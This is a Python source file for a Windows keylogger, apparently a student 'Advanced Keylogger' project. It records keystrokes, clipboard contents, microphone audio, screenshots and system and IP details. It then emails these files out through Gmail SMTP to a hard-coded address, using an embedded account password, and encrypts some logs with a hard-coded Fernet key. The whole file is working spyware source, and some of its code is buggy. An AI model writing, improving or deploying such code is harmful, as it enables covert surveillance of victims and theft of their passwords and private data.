#Libraries

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from win32clipboard import CloseClipboard

#Variables

keys_information="key_log.txt"
system_information="system_info.txt"
clipboard_information="clipboard.txt"
audio_information="audio.wav"
screenshot_information="screenshot.png"
keys_information_e="e_key_log.txt"
system_information_e="e_systeminfo.txt"
clipboard_information_e="e_clipboard.txt"
microphone_time=10
time_iteration=15
number_of_iterations_end=3
key="XSXYuAiGDHxtY1saJK0lUWrM2PtpjUSrY3GCWJWbF-c="
email_address="forprojects124@gmail.com"
password="kqqe wqlc etzm zhbr"
toaddr="forprojects124@gmail.com"
file_path="D:\\Study\\CyberSecurity\\Advanced Keylogger\\Project"
extend="\\"
file_merge = file_path + extend

def send_email(filename, attachment, toaddr):
    fromaddr= email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body,'plain'))
    filename = filename
    attachment = open(attachment,'rb')
    p = MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment: filename= %s" % filename)
    msg.attach(p)
    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(fromaddr,password)
    text=msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

send_email(keys_information, file_path + extend + keys_information, toaddr )


def computer_information():
    with open(file_path + extend + system_information, "a") as f:  # Corrected here
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't find public IP Address (most likely max query)\n")
            f.write("Processor: " + platform.processor() + '\n')
            f.write("System: " + platform.system() + " " + platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')

computer_information()

def copy_clipboard():
    with open(file_merge + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data.decode('utf-8') + "\n")
        except Exception as e:
            f.write("Clipboard could not be copied: " + str(e) + "\n")
        finally:
            try:
                win32clipboard.CloseClipboard()
            except:
                pass

copy_clipboard()

def microphone():
    fs=44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)

microphone()

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()
number_of_iterations=0
currrentTime= time.time()
stoppingTime= time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count=0
    keys=[]

    def on_press(key):
        global keys,count, currentTime
        print(key)
        keys.append(key)
        count+=1
        currentTime=time.time()

        if count >= 1:
            count=0
            write_file(keys)
            keys=[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k=str(key).replace("'","")
                if k.find("space")>0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc or currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        copy_clipboard()
        number_of_iterations +=1
        currenttime=time.time()
        stoppingTime = time.time() + time_iteration

files_to_encrypt= [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]
count=0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted=fernet.encrypt(data)

    with open(encrypted_file_names[count], 'rb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count+=1

time.sleep(120)